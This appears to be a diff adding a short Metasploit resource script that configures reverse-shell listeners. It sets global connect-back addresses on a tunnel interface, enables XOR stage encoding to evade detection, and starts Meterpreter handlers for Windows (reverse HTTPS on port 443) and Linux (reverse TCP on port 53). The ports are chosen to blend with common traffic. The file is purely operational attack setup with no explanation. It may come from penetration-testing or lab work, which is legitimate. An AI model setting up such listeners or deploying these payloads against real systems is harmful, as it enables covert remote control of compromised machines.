@@ -1,0 +1,8 @@
+db_status
+set --global lhost tun0
+set --global lport 53
+set --global EnableStageEncoding true
+set --global StageEncoder x64/xor
+handler -p windows/x64/meterpreter/reverse_winhttps -H tun0 -P 443
+handler -p linux/x64/meterpreter/reverse_tcp -H tun0 -P 53
+set --global DisablePayloadHandler true
